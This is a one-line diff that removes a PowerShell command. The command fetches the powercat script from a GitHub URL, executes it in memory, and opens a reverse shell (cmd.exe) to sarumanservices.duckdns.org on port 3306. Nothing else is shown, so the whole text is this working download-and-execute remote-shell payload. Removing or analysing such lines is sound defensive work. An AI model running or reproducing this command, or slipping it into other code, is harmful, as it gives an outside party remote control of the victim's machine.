@@ -1,1 +1,0 @@
-powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/marlinho98/marlinho98.github.io/master/_posts/powercat.ps1');powercat -c sarumanservices.duckdns.org -p 3306 -e cmd"
